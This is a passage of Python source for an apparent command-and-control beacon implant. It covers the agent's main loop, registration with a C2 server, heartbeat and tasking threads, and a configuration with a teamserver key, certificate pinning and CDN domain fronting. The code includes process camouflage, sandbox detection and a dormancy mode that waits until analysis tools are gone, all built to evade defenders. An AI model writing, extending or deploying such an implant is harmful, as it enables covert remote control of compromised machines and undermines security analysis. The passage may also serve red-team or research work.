                    pass

    # ── Dormancy (analysis environment detected) ────────────────────────────

    def _dormant(self) -> None:
        """
        Long-sleep mode activated when analysis environment is detected.
        The agent wakes hourly, re-evaluates conditions, and only exits
        dormancy when the environment looks clean.
        """
        while self._running:
            self._stop_event.wait(_DORMANT_WAKE_INTERVAL)
            if not self._running:
                return
            if not _AntiAnalysis.check().suspicious():
                return  # environment looks clean, proceed

    # ── Main loop ───────────────────────────────────────────────────────────

    def run(self) -> None:
        _ProcessCamouflage.apply()

        if self.cfg.evasion_mode:
            report = _AntiAnalysis.check()
            if report.suspicious():
                self._dormant()
                if not self._running:
                    return

        # Registration — capped exponential backoff, ceiling 5 min
        backoff = float(self.cfg.reg_retry_delay)
        while self._running and not self._register():
            if self._stop_event.wait(backoff + random.uniform(0, backoff * 0.2)):
                return
            backoff = min(backoff * 2, 300.0)

        if not self._running:
            return

        for target, name in (
            (self._heartbeat_loop,    "beacon-hb"),
            (self._result_sender_loop, "beacon-rs"),
        ):
            threading.Thread(target=target, name=name, daemon=True).start()

        executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=4, thread_name_prefix="task"
        )
        try:
            while self._running:
                self._sleep_jitter()
                if not self._running:
                    break
                for task in self._checkin():
                    def _run(t=task) -> None:
                        self._rq.enqueue(self._handlers.dispatch(t))
                    executor.submit(_run)
        finally:
            executor.shutdown(wait=False)
            if self._agent_key:
                for result in self._rq.drain(256):
                    self._try_post_result(result)
            self._master_key.clear()
            if self._agent_key:
                self._agent_key.clear()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    cfg = BeaconConfig(
        c2_host          = "127.0.0.1",
        c2_port          = 8443,
        master_key_hex   = "",          # <- teamserver master key
        cert_fingerprint = "",          # <- SHA-256 of server TLS cert
        fronting_host    = "",          # <- CDN fronting hostname
        sleep_min        = 30,
        sleep_max        = 90,
        evasion_mode     = True,
    )
    Agent(cfg).run()
